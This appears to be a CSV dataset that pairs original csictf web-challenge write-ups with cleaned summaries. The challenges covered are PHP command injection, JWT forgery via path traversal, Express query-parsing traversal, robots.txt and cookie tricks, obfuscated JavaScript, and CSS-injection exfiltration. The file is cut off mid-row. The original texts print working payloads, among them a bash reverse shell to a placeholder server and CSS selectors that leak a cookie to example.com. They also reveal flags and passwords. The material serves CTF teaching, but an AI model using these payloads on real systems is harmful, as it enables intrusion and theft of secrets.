"original","cleaned"
"# Body Count

Author: [AJ1479](https://github.com/AJ1479) and [roerohan](https://github.com/roerohan)

## Description

This challenge is based on PHP code injection to set up a reverse shell. 

## Requirements

- Docker: [Dockerfile](./Dockerfile)

## Sources

```
Here's a character count service for you!
```

## Exploit

First, when you visit the website, you get redirected to `/?file=wc.php`. This might indicate that you can include files from the server, such as `/?file=/etc/passwd`. You can see in this file that there's a user called `ctf`, but that's not useful yet. Moving on, you can find out that there's a `robots.txt` file at `?file=robots.txt`.

```
Disallow: /?file=checkpass.php
```

Visiting that URL, you get redirected back to `/wc.php`. However, it maybe that there's some code in `checkpass.php` that might be important. If you request it in `python`, you can see:

```python
>>> r = requests.get('http://chall.csivit.com:30202?file=checkpass.php', allow_redirects=False)
>>> r.text
'IMPORTANT!!! The page is still under development. This has a secret, do not push this page.'
```

We can try to view the source of this page with the help of `php://filter`. Visit the website:

```
/?file=php://filter/convert.base64-encode/resource=checkpass.php

PD9waHAKJHBhc3N3b3JkID0gIncwcmRjMHVudDEyMyI7Ci8vIENvb2tpZSBwYXNzd29yZC4KZWNobyAiSU1QT1JUQU5UISEhIFRoZSBwYWdlIGlzIHN0aWxsIHVuZGVyIGRldmVsb3BtZW50LiBUaGlzIGhhcyBhIHNlY3JldCwgZG8gbm90IHB1c2ggdGhpcyBwYWdlLiI7CgpoZWFkZXIoJ0xvY2F0aW9uOiAvJyk7Cg==
```

When you base64 decode this, you get:

```bash
$ echo ""PD9waHAKJHBhc3N3b3JkID0gIncwcmRjMHVudDEyMyI7Ci8vIENvb2tpZSBwYXNzd29yZC4KZWNobyAiSU1QT1JUQU5UISEhIFRoZSBwYWdlIGlzIHN0aWxsIHVuZGVyIGRldmVsb3BtZW50LiBUaGlzIGhhcyBhIHNlY3JldCwgZG8gbm90IHB1c2ggdGhpcyBwYWdlLiI7CgpoZWFkZXIoJ0xvY2F0aW9uOiAvJyk7Cg=="" | base64 -d
<?php
$password = ""w0rdc0unt123"";
// Cookie password.
echo ""IMPORTANT!!! The page is still under development. This has a secret, do not push this page."";

header('Location: /');
```

So, we can see a suspicious `$password` variable. Let's also check the source for `wc.php`. 

```bash
$ echo ""PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJpZT1lZGdlIj4KICAgIDx0aXRsZT53YyBhcyBhIHNlcnZpY2U8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGh0bWwsCiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIG92ZXJmbG93OiBub25lOwogICAgICAgICAgICBtYXgtaGVpZ2h0OiAxMDB2aDsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cgo8Ym9keSBzdHlsZT0iaGVpZ2h0OiAxMDB2aDsgdGV4dC1hbGlnbjogY2VudGVyOyBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsgY29sb3I6IHdoaXRlOyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsiPgogICAgPD9waHAKICAgIGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsIDUpOwogICAgaWYgKCRfQ09PS0lFWydwYXNzd29yZCddICE9PSBnZXRlbnYoJ1BBU1NXT1JEJykpIHsKICAgICAgICBzZXRjb29raWUoJ3Bhc3N3b3JkJywgJ1BBU1NXT1JEJyk7CiAgICAgICAgZGllKCdTb3JyeSwgb25seSBwZW9wbGUgZnJvbSBjc2l2aXQgYXJlIGFsbG93ZWQgdG8gYWNjZXNzIHRoaXMgcGFnZS4nKTsKICAgIH0KICAgID8+CgogICAgPGgxPkNoYXJhY3RlciBDb3VudCBhcyBhIFNlcnZpY2U8L2gxPgogICAgPGZvcm0+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgdmFsdWU9IndjLnBocCIgbmFtZT0iZmlsZSI+CiAgICAgICAgPHRleHRhcmVhIHN0eWxlPSJib3JkZXItcmFkaXVzOiAxcmVtOyIgdHlwZT0idGV4dCIgbmFtZT0idGV4dCIgcm93cz0zMCBjb2xzPTEwMD48L3RleHRhcmVhPjxiciAvPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiPgogICAgPC9mb3JtPgogICAgPD9waHAKICAgIGlmIChpc3NldCgkX0dFVFsidGV4dCJdKSkgewogICAgICAgICR0ZXh0ID0gJF9HRVRbInRleHQiXTsKICAgICAgICBlY2hvICI8aDI+VGhlIENoYXJhY3RlciBDb3VudCBpczogIiAuIGV4ZWMoJ3ByaW50ZiBcJycgLiAkdGV4dCAuICdcJyB8IHdjIC1jJykgLiAiPC9oMj4iOwogICAgfQogICAgPz4KPC9ib2R5PgoKPC9odG1sPg=="" | base64 -d
<!DOCTYPE html>
<html lang=""en"">

<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <meta http-equiv=""X-UA-Compatible"" content=""ie=edge"">
    <title>wc as a service</title>
    <style>
        html,
        body {
            overflow: none;
            max-height: 100vh;
        }
    </style>
</head>

<body style=""height: 100vh; text-align: center; background-color: black; color: white; display: flex; flex-direction: column; justify-content: center;"">
    <?php
    ini_set('max_execution_time', 5);
    if ($_COOKIE['password'] !== getenv('PASSWORD')) {
        setcookie('password', 'PASSWORD');
        die('Sorry, only people from csivit are allowed to access this page.');
    }
    ?>

    <h1>Character Count as a Service</h1>
    <form>
        <input type=""hidden"" value=""wc.php"" name=""file"">
        <textarea style=""border-radius: 1rem;"" type=""text"" name=""text"" rows=30 cols=100></textarea><br />
        <input type=""submit"">
    </form>
    <?php
    if (isset($_GET[""text""])) {
        $text = $_GET[""text""];
        echo ""<h2>The Character Count is: "" . exec('printf \'' . $text . '\' | wc -c') . ""</h2>"";
    }
    ?>
</body>

</html>%     
```

Here, you can see that a `password` cookie is being checked. Enter the password from the `$password` variable as the cookie (`w0rdc0unt123`), then you can see the webpage.
<br />

You also see in the source of `wc.php` that the input `$text` is obtained from the get param `text`, and is passed into `exec`. 
So, we can get remote code execution from here! Try with the payload:

```
'; ls #
```

You can see the following output:

```
The Character Count is: wc.php
```

But, we know for a fact that there's also `robots.txt` and `checkpass.php` in this folder. You then findout that `echo exec(...)` returns only the last line of the output. We have 2 choices from here. Either we do `'; <command> | tr '\n' '' #` to replace all new-lines with spaces, throughout the rest of the exploit. Otherwise, you can try to spawn a reverse shell, and then use your server to navigate through the directories. I'm going to use the `reverse shell` method.

```
'; bash -c ""bash -i >& /dev/tcp/your.server.ip.address/8000 0>&1"" #
```

> Note: Replace `your.server.ip.address` with your server's IP.

Once you pass this in the input, you get a shell on your server!

```bash
www-data@9c9f6ae73053:/var/www/html$ ls      
ls
checkpass.php
index.php
robots.txt
wc.php
www-data@9c9f6ae73053:/var/www/html$ 
```

Let's navigate through the file system and see if there's something interesting. You can see there's a folder `/ctf`. Inside that, there are a lot of folders.

```bash
www-data@9c9f6ae73053:/ctf$ ls
ls
README
avenged
dream
findaas
led
system
www-data@9c9f6ae73053:/ctf$ 
```

There's also a `findaas` bash script, which you can use to locate `flag.txt` (or you can use the find command directly).

```bash
www-data@9c9f6ae73053:/ctf$ ./findaas flag.txt
./findaas flag.txt
Enter a filename and find it here!
./system/of/a/down/flag.txt
www-data@9c9f6ae73053:/ctf$ 
```

Now that you know where the flag is, you can just cat the flag!

```
www-data@9c9f6ae73053:/ctf$ cat ./system/of/a/down/flag.txt
cat ./system/of/a/down/flag.txt
cat: ./system/of/a/down/flag.txt: Permission denied
www-data@9c9f6ae73053:/ctf$ 
```

But there's a catch. You don't have permission to cat the flag. However, when you see the `README` file, it says that the password hash for `ctf` is `6f246c872cbf0b7fd7530b7aa235e67e`. You can bruteforce that using offline tools or using [crackstation.net](https://crackstation.net/), and find out that the password is `csictf` (maybe you could've guessed it too). Now, you can just switch to the user `ctf` and print the flag!

```bash
www-data@9c9f6ae73053:/ctf$ su ctf
su ctf
Password: csictf
cat ./system/of/a/down/flag.txt
csictf{1nj3ct10n_15_p41nfu1}
```

Congrats! You have found the flag.

The flag is:

```
csictf{1nj3ct10n_15_p41nfu1}
```","When you visit the website, you get redirected to `/?file=wc.php`. This might indicate that you can include files from the server, such as `/?file=/etc/passwd`. You can see in this file that there's a user called `ctf`, but that's not useful yet.

Moving on, you can find out that there's a `robots.txt` file at `?file=robots.txt`.
In it there is the `/?file=checkpass.php` file disallowed.

Visiting that URL, you get redirected back to `/wc.php`. However, it maybe that there's some code in `checkpass.php` that might be important. If you request it in `python` using `requests`, you can see that the response text says: ""IMPORTANT!!! The page is still under development. This has a secret, do not push this page.""

We can try to view the source of this page with the help of `php://filter`. Visit the website a base64 encoded string.

When you base64 decode this, you get some PHP code:
[This code shows the password as hardcoded, and that it's a cookie password. The page also contains an advice to not to push this page. The last line of the code redirects you to the homepage.]

Let's also check the source for `wc.php`. 

Here, you can see that a `password` cookie is being checked. Enter the password from the `$password` variable as the cookie (`w0rdc0unt123`), then you can see the webpage.

You also see in the source of `wc.php` that the input `$text` is obtained from the get param `text`, and is passed into `exec`. 
So, we can get remote code execution from here! Try with the payload: `'; ls #`

You can see the following output: ""The Character Count is: wc.php""

But, we know for a fact that there's also `robots.txt` and `checkpass.php` in this folder. You then findout that `echo exec(...)` returns only the last line of the output. We have 2 choices from here. Either we do `'; <command> | tr '\n' '' #` to replace all new-lines with spaces, throughout the rest of the exploit. Otherwise, you can try to spawn a reverse shell, and then use your server to navigate through the directories. I'm going to use the `reverse shell` method.
[Reverse shell payload: Execute a command to establish a reverse shell connection to your server]

Once you pass this in the input, you get a shell on your server!

Let's navigate through the file system and see if there's something interesting. You can see there's a folder `/ctf`. Inside that, there are a lot of folders.

There's also a a bash script called`findaas`, which you can be used to locate the file `flag.txt`. Alternatively, you can use the find command directly.

Now that you know where the flag is located, you can try to read the contents of the file using the cat command. However, when you try to read the flag file, you get a ""Permission denied"" error.

But there's a catch. You don't have permission to cat the flag. However, when you see the `README` file, it says that the password hash for `ctf` is `6f246c872cbf0b7fd7530b7aa235e67e`. You can bruteforce that using offline tools or using [crackstation.net], and find out that the password is `csictf` (maybe you could've guessed it too).

Now, you can switch to the `ctf` user using the `su` command with the password `csictf`.
Finally, you can print the flag by using the cat command with the flag file path.
"
"# CCC

Author: [roerohan](https://github.com/roerohan)

## Description

This challenge is based on Path Traversal and JWTs.

## Requirements

- Docker: [Dockerfile](./Dockerfile)
- Knowledge of JWT

## Sources

```
You can steal a car if you steal its key.
```

## Exploit

First, in the website source, you can see that there's a route to login (`/login`) and a route to get the names of the admins (`/adminNames`). So, when you try to visit `/login`, you see a form. Post that and check the response on the Network Tab in your browser. You can see there's a header called `token` which stores a JWT. You can decode the token (maybe on [jwt.io](https://jwt.io)) to see that the payload is of this format (I typed username: asd, password: asd):

```
{
  ""username"": ""nfq"",
  ""password"": ""nfq"",
  ""admin"": ""snyfr"",
  ""iat"": 1593506966
}
```

We can see that the `username` changed from `asd` to `nfq`. So this hints that this could be `rot13`. When you apply the `rot13` cipher on the admin value `snyfr`, you see that it returns a string `false`. So, we can change this to a rot13 encrypted string for `true`, but to do that, we need the JWT secret.
<br />

On going back to the page, you see there's a route called `/adminNames`. It downloads a file for you, which has sort of a URL: `csivitu/authorized_users/blob/master/`. Seems familiar? This looks like a GitHub URL. So, if you visit that repository on GitHub, and checkout the `root` file [here](https://github.com/csivitu/authorized_users/blob/master/csivit/root), you can see a list of usernames.

```
thebongy
roerohan
namsnath
sudo-nan0-RaySK
theProgrammerDavid
sauravhiremath
```

These are the usernames of the website admins! Now, in the JWT you were creating, you can change the `username` key to a rot13 encrypted version of one of these, for example, `ebrebuna` is the rot13 encrypted ciphertext for `roerohan`. Here's what our JWT payload looks like now:

```
{
  ""username"": ""ebrebuna"",
  ""password"": ""nfq"",
  ""admin"": ""gehr"",
  ""iat"": 1593506966
}
```

But, we still need the JWT secret. If you observe the request on `/adminNames`, you see that it actally redirects to `/getFile?file=admins`. This route seems suspicious. We can try to include other files using this. When you try `/getFile?file=.env`, it returns `No such file or directory: /app/public/.env`. So, we can try `../.env` to come out of the public folder. You get a file in return, which is the `.env` containing the secret!

```
JWT_SECRET=Th1sSECr3TMu5TN0Tb3L43KEDEv3RRRRRR!!1
```

Use this secret to create a new token. Now, visit the `/admin` route. It says:

```
{
  ""success"": false,
  ""message"": ""Invalid Token, Headers?""
}
```

Which means, you'll have to pass the JWT in the headers. Auth tokens are generally passed in the Authorization header, so let's try that. When you pass the new formed JWT in the Authorization header. You can do this using python.

```python
>>> import requests
>>> r= requests.get('http://localhost:3000/admin', headers={'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImVicmVidW5hIiwicGFzc3dvcmQiOiJuZnEiLCJhZG1pbiI6ImdlaHIiLCJpYXQiOjE1OTM1MDY5NjZ9.LCbBdHCDlx64bTFeErtBAeoL000HIqyFStvUxlTtVE8'})
>>> r.text
```

The text in the response is:

```
Hey roerohan! Here's your flag: pfvpgs{1a_gu3_3aq_1g_q0rfa'g_3i3a_z4gg3e}
```

rot13 decrypt this flag to get the real flag.
<br />

The flag is:

```
csictf{1n_th3_3nd_1t_d0esn't_3v3n_m4tt3r}
```","Description: ""You can steal a car if you steal its key.""

First, in the website source, you can see that there's a route to login (`/login`) and a route to get the names of the admins (`/adminNames`). So, when you try to visit `/login`, you see a form. Post that and check the response on the Network Tab in your browser. You can see there's a header called `token` which stores a JWT. You can decode the token (maybe on `jwt.io` to see that the payload is the following (I typed username: asd, password: asd):
`{ ""username"": ""nfq"", ""password"": ""nfq"", ""admin"": ""snyfr"", ""iat"": 1593506966 }`

We can see that the `username` changed from `asd` to `nfq`. So this hints that this could be `rot13`. When you apply the `rot13` cipher on the admin value `snyfr`, you see that it returns a string `false`. So, we can change this to a rot13 encrypted string for `true`, but to do that, we need the JWT secret.

On going back to the page, you see there's a route called `/adminNames`. It downloads a file for you, which has sort of a URL: `csivitu/authorized_users/blob/master/`. Seems familiar? This looks like a GitHub URL. So, if you visit that repository on GitHub, and checkout the `root`, you can see a list of usernames. These are the usernames of the website admins!

Now, in the JWT you were creating, you can change the `username` key to a rot13 encrypted version of one of these, for example, `ebrebuna` is the rot13 encrypted ciphertext for `roerohan`. Here's what our JWT payload looks like now:
`{ ""username"": ""ebrebuna"", ""password"": ""nfq"", ""admin"": ""gehr"", ""iat"": 1593506966 }`

But, we still need the JWT secret. If you observe the request on `/adminNames`, you see that it actally redirects to `/getFile?file=admins`. This route seems suspicious. We can try to include other files using this. When you try `/getFile?file=.env`, it returns `No such file or directory: /app/public/.env`. So, we can try `../.env` to come out of the public folder. You get a file in return, which is the `.env` containing the secret!

Now, visit the /admin route. It says that the token is invalid, so you'll have to pass the JWT in the headers. Auth tokens are generally passed in the Authorization header, so let's try that. When you pass the new formed JWT in the Authorization header, you can do this using python.
[Python snippet: Send a GET request to the /admin route with the JWT in the Authorization header]

The text in the response is:
""Hey roerohan! Here's your flag: pfvpgs{1a_gu3_3aq_1g_q0rfa'g_3i3a_z4gg3e}""

rot13 decrypt this flag to get the real flag.
"
"# File Library

Author: [roerohan](https://github.com/roerohan)

## Description

Express query parsing vulnerability.

## Requirements

- Express.js
- qs package used by Express.js

## Sources

- [server.js](./server.js)
- Deployed website using server.js

```
This is my file library. I don't have a lot of files, but I hope you like the ones I have!
```

## Exploit

This exploit is owing to the `qs` package used by `express` to parse `req.query`. You can send an array instead of a string through the GET params in the following manner:

```ja
/route?words[]=hello&words[]=world
```

This makes the `req.names` in the backend an array: `['hello', 'world']`.

```javascript
const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Listening on port ${PORT}`);
});

app.get('/getFile', (req, res) => {
    let { file } = req.query;

    // If file name is undefined
    if (!file) {
        res.send(`file=${file}\nFilename not specified!`);
        return;
    }

    try {
        // If file name has characters like ' ', '/', fail.
        if (file.includes(' ') || file.includes('/')) {
            res.send(`file=${file}\nInvalid filename!`);
            return;
        }
    } catch (err) {
        res.send('An error occured!');
        return;
    }

    // Check if file type is allowed.
    if (!allowedFileType(file)) {
        res.send(`File type not allowed`);
        return;
    }

    // If the file name is too long, shorten it.
    if (file.length > 5) {
        file = file.slice(0, 5);
    }

    // Get the path for the file.
    const returnedFile = path.resolve(__dirname + '/' + file);

    // Read file to check if file exists
    fs.readFile(returnedFile, (err) => {
        if (err) {
            if (err.code != 'ENOENT') console.log(err);
            res.send('An error occured!');
            return;
        }

        res.sendFile(returnedFile);
    });
});

app.get('/*', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

function allowedFileType(file) {
    const format = file.slice(file.indexOf('.') + 1);

    // Allow only `js` and `txt` files.
    if (format == 'js' || format == 'ts' || format == 'c' || format == 'cpp') {
        return true;
    }

    return false;
}
```

The `/getFile` route is meant to get you a file from the server. But there are certain restrictions. First, you can't have ` `s or `/`s in your file. This prevents path traversal to an extent. 
<br />

Then, it checks that the `file` parameter has a length of less than 5 characters. If not, it takes just the first 5 characters. Then, it checks if the file extension is `js`, `ts`, `cpp`, or `c`, if yes, it allows you to read that file. If all these are satisfied, the path is resolved using `path.resolve()`.
<br />

In the `a.cpp` file, it says `system(""cat flag.txt"")`, indicating that the flag is present in the same directory in the `flag.txt`. We can pass in an array which passes the first 2 checks. Then it has to check if the `.slice(file.indexOf('.') + 1)`, so the last 2 elements have to be `['.', 'js']`. So, we can try passing `['flag.txt', '.', 'js']`, which makes the path `/home/user/flag.txt,.,js`, which is invalid. However, we can make use of the `path.resolve()`, and the fact that only the first 5 elements are used. If the array becomes `['a', 'b', 'c', 'd', '/../flag.txt', '.', 'js']` (`js` because `txt` is not allowed). So, this passed the file check, because `.slice()` returns `['js']` and `['js'] == 'js'` is true (not used `===`). Now, to get rid of this, we add 4 random elements before the element having `flag.txt`.
<br />

Now, the string upon concatenation will give `${pwd}/a,b,c,d,/../flag.txt` (now you see why we added `/../`), so that it resolves to `${pwd}/flag.txt` because of `flag.txt`. The payload, therefore, is:

```
/getFile?file[]=a&file[]=b&file[]=c&file[]=d&file[]=/../flag.txt&file[]=.&file[]=js
```

The flag is:

```
csictf{5h0uld_5tr1ng1fy_th3_p4r4ms}
```
","Description: ""This is my file library. I don't have a lot of files, but I hope you like the ones I have!""

This exploit is owing to the `qs` package used by `express` to parse `req.query`. You can send an array instead of a string through the GET params in the following manner:
[GET request with an array as a parameter]

This makes the `req.names` in the backend an array: `['hello', 'world']`.
[JavaScript code of a simple Express app with a /getFile route and other routes]

The `/getFile` route is meant to get you a file from the server. But there are certain restrictions. First, you can't have ` `s or `/`s in your file. This prevents path traversal to an extent. 

Then, it checks that the `file` parameter has a length of less than 5 characters. If not, it takes just the first 5 characters. Then, it checks if the file extension is `js`, `ts`, `cpp`, or `c`, if yes, it allows you to read that file. If all these are satisfied, the path is resolved using `path.resolve()`.

In the `a.cpp` file, it says `system(""cat flag.txt"")`, indicating that the flag is present in the same directory in the `flag.txt`. We can pass in an array which passes the first 2 checks. Then it has to check if the `.slice(file.indexOf('.') + 1)`, so the last 2 elements have to be `['.', 'js']`. So, we can try passing `['flag.txt', '.', 'js']`, which makes the path `/home/user/flag.txt,.,js`, which is invalid. However, we can make use of the `path.resolve()`, and the fact that only the first 5 elements are used. If the array becomes `['a', 'b', 'c', 'd', '/../flag.txt', '.', 'js']` (`js` because `txt` is not allowed). So, this passed the file check, because `.slice()` returns `['js']` and `['js'] == 'js'` is true (not used `===`). Now, to get rid of this, we add 4 random elements before the element having `flag.txt`.

Now, the string upon concatenation will give `${pwd}/a,b,c,d,/../flag.txt` (now you see why we added `/../`), so that it resolves to `${pwd}/flag.txt` because of `flag.txt`. The payload, therefore, is:
`/getFile?file[]=a&file[]=b&file[]=c&file[]=d&file[]=/../flag.txt&file[]=.&file[]=js`

And you can get the flag.
"
"# Mr. Rami

Author: [roerohan](https://github.com/roerohan)

## Description

This is a simple `robots.txt` challenge.

## Requirements

- Knowledge of `robots.txt`.

## Sources

- [index.html](./index.html)
- [flag.txt](./flag.txt)
- [robots.txt](./robots.txt)
- [server.py](./server.py)

```
""People who get violent get that way because they can’t communicate.""
```

## Exploit

When you google the challenge description, you find out that the quote is from Mr. Robot. This indicates that the user might want to check out the `robots.txt` for the website.
<br />

When you open the website, it serves the `index.html` file, which has content written about `Brobot`, again trying to put across `robots.txt`. When you visit `robots.txt`, you see:

```
# Hey there, you're not a robot, yet I see you sniffing through this file.
# SEO you later!
# Now get off my lawn.

Disallow: /fade/to/black
```

When you visit the disallowed route, you get the flag!
<br />

The flag is:

```
csictf{br0b0t_1s_pr3tty_c00l_1_th1nk}
```
","Description: ""People who get violent get that way because they can't communicate.""

When you google the challenge description, you find out that the quote is from Mr. Robot. This indicates that the user might want to check out the `robots.txt` for the website.

When you open the website, it serves the `index.html` file, which has content written about `Brobot`, again trying to put across `robots.txt`.

When you visit `robots.txt` and visit the disallowed route, you get the flag!
"
"# Oreo

Author: [AJ1479](https://github.com/AJ1479)

## Description

This is a simple cookie-changing web challenge.

## Requirements

- [Dockerfile](./Dockerfile)

## Sources

```
My nephew is a fussy eater and is only willing to eat chocolate oreo. Any other flavour and he throws a tantrum.
```

## Exploit

You just need to change the cookie value to the base64 value of ""chocolate"".

<br />

The flag is:

```
csictf{1ick_twi5t_dunk}
```","Description: ""My nephew is a fussy eater and is only willing to eat chocolate oreo. Any other flavour and he throws a tantrum.""

You just need to change the cookie value to the base64 value of ""chocolate"".
And you get the flag.
"
"# Secure Portal
Author: [ashikka](https://github.com/ashikka)

## Description

Obfuscated JS in Frontend

## Requirements 

- Dev-tools
- [Dockerfile](./Dockerfile)

## Sources

```
This is a super secure portal with a really unusual HTML file. Try to login.
```

## Exploit

You need to view the page source, which contains something like this: 

```javascript
var _0x575c=['\x32\x2d\x34','\x73\x75\x62\x73\x74\x72\x69\x6e\x67','\x34\x2d\x37','\x67\x65\x74\x49\x74\x65\x6d','\x64\x65\x6c\x65\x74\x65\x49\x74\x65\x6d','\x31\x32\x2d\x31\x34','\x30\x2d\x32','\x73\x65\x74\x49\x74\x65\x6d','\x39\x2d\x31\x32','\x5e\x37\x4d','\x75\x70\x64\x61\x74\x65\x49\x74\x65\x6d','\x62\x62\x3d','\x37\x2d\x39','\x31\x34\x2d\x31\x36','\x6c\x6f\x63\x61\x6c\x53\x74\x6f\x72\x61\x67\x65',];(function(_0x4f0aae,_0x575cf8){var _0x51eea2=function(_0x180eeb){while(--_0x180eeb){_0x4f0aae['push'](_0x4f0aae['shift']());}};_0x51eea2(++_0x575cf8);}(_0x575c,0x78));var _0x51ee=function(_0x4f0aae,_0x575cf8){_0x4f0aae=_0x4f0aae-0x0;var _0x51eea2=_0x575c[_0x4f0aae];return _0x51eea2;};function CheckPassword(_0x47df21){var _0x4bbdc3=[_0x51ee('0xe'),_0x51ee('0x3'),_0x51ee('0x7'),_0x51ee('0x4'),_0x51ee('0xa')];window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]('9-12','BE*');window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0x2'),_0x51ee('0xb'));window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0x6'),'5W');window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]('16',_0x51ee('0x9'));window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0x5'),'pg');window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]('7-9','+n');window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0xd'),'4t');window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee('0x0'),'$F');if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x8'))===_0x47df21[_0x51ee('0x1')](0x9,0xc)){if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x2'))===_0x47df21['substring'](0x4,0x7)){if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x6'))===_0x47df21[_0x51ee('0x1')](0x0,0x2)){if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]('16')===_0x47df21[_0x51ee('0x1')](0x10)){if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x5'))===_0x47df21[_0x51ee('0x1')](0xc,0xe)){if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0xc'))===_0x47df21[_0x51ee('0x1')](0x7,0x9)){if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0xd'))===_0x47df21[_0x51ee('0x1')](0xe,0x10)){if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee('0x0'))===_0x47df21[_0x51ee('0x1')](0x2,0x4))return!![];}}}}}}}return![];}
```
On seeing this, you will realize that this script has been obsfucated, and is checking for the password for this portal. The list `var _0x575c` has been encoded to hex, which translates to this.

```javascript
var _0x575c = [""2-4"", ""substring"", ""4-7"", ""getItem"", ""deleteItem"", ""12-14"", ""0-2"", ""setItem"", ""9-12"", ""^7M"", ""updateItem"", ""bb="", ""7-9"", ""14-16"", ""localStorage""];
```

Now, in the function `CheckPassword`, you see the word `window` being repeated many times. For an example, the line `window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]` is actually `window.localStorage.setItem` and so on. The password has been split to many parts. This command stores each part of the password to an assigned key.
Similarly, the line `window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]` is `window.localStorage.getItem`. We use this command to check the splitted password with our input password. The password is `5W$Fbb=+nBE*pg4t^7M`.
<br />

The flag is:

```
csictf{l3t_m3_c0nfus3_y0u}
```
","Description: ""This is a super secure portal with a really unusual HTML file. Try to login.""

You need to view the page source.
On seeing it, you will realize that this script has been obsfucated, and is checking for the password for this portal. The list `var _0x575c` has been encoded to hex, which translates to this: `var _0x575c = [""2-4"", ""substring"", ""4-7"", ""getItem"", ""deleteItem"", ""12-14"", ""0-2"", ""setItem"", ""9-12"", ""^7M"", ""updateItem"", ""bb="", ""7-9"", ""14-16"", ""localStorage""];`

Now, in the function `CheckPassword`, you see the word `window` being repeated many times. For an example, the line `window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]` is actually `window.localStorage.setItem` and so on.

The password has been split to many parts.
We have each part of the password stored to an assigned key.
Similarly, the line `window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]` is `window.localStorage.getItem`. We use this command to check the splitted password with our input password.
"
"# The Confused Deputy

Author: [roerohan](https://github.com/roerohan)

## Description

This website can be exploited with the help of CSS Injection.

## Requirements

- Docker: [Dockerfile](./Dockerfile)
- Node.js

## Sources

```
Wow that's a pretty color! Don't you think? Pick your favourite and show it to the admin on /admin.
```

## Exploit

This is a CSS injection challenge (of course you can do `<<script >>` but the intended solution is CSS injection). In the page you open, you can see that there is an input box where you can enter a color, which gets applied as you click on submit. There's also a hidden field `password`, the value of which is taken from the cookie. Since the string is interpolated, you can do something like `blue}; input[type=""password""][value^=""c""] {background-image: url('https://example.com?c');`, which will send a request to `example.com?c`, if the first character of the password is `c`.
<br />

You may pass a long list of such CSS selectors, for all letters, for example. For example:

```css
input[type=""password""][value^=""a""] {background-image: url('https://example.com?a');}
input[type=""password""][value^=""b""] {background-image: url('https://example.com?b');}
input[type=""password""][value^=""c""] {background-image: url('https://example.com?c');}
...
```

This will therefore tell you which character matched, which you can see on your own server (here example.com). Once the first character is leaked, you can go ahead and try to leak the next character.

```css
input[type=""password""][value^=""ca""] {background-image: url('https://example.com?ca');}
input[type=""password""][value^=""cb""] {background-image: url('https://example.com?cb');}
input[type=""password""][value^=""cc""] {background-image: url('https://example.com?cc');}
...
```

An so on, until you find the entire password. You can test this on your browser by storing a cookie called `password` with the value `csictf`. Now pass the following to get a request on your server (replace example.com with your server).

```css
blue;} input[type=""password""][value^=""csictf""] {background-image: url('https://example.com?csictf');
```

Pass these payloads to `/admin` and you can leak the admin cookie `password`, which is the flag. The final payload with the help of which you can find the entire flag is:

```css
blue;} input[type=""password""][value^=""csictf{cssxss}""] {background-image: url('https://example.com?csictf{cssxss}');
```

<br />

The flag is:

```
csictf{cssxss}
```","Description: ""Wow that's a pretty color! Don't you think? Pick your favourite and show it to the admin on /admin.""

This is a CSS injection challenge (of course you can do `<<script >>` but the intended solution is CSS injection). In the page you open, you can see that there is an input box where you can enter a color, which gets applied as you click on submit. There's also a hidden field `password`, the value of which is taken from the cookie. Since the string is interpolated, you can do something like `blue}; input[type=""password""][value^=""c""] {background-image: url('https://example.com?c');`, which will send a request to `example.com?c`, if the first character of the password is `c`.

You may pass a long list of such CSS selectors, for all letters.

This will therefore tell you which character matched, which you can see on your own server (here example.com). Once the first character is leaked, you can go ahead and try to leak the next character.

An so on, until you find the entire password. You can test this on your browser by storing a cookie called `password` with the value `csictf`. Now pass the following to get a request on your server (replace example.com with your server).

Pass these payloads to `/admin` and you can leak the admin cookie `password`, which is the flag.

Using this method, you can progressively leak the entire password and obtain the flag.
"
"# The Usual Suspects

Author: [SrishtiGohain](https:github.com/SrishtiGohain)

## Description

This is a simple Server Side Template Injection challenge.

## Requirements

- Python
- tornado

## Sources

```
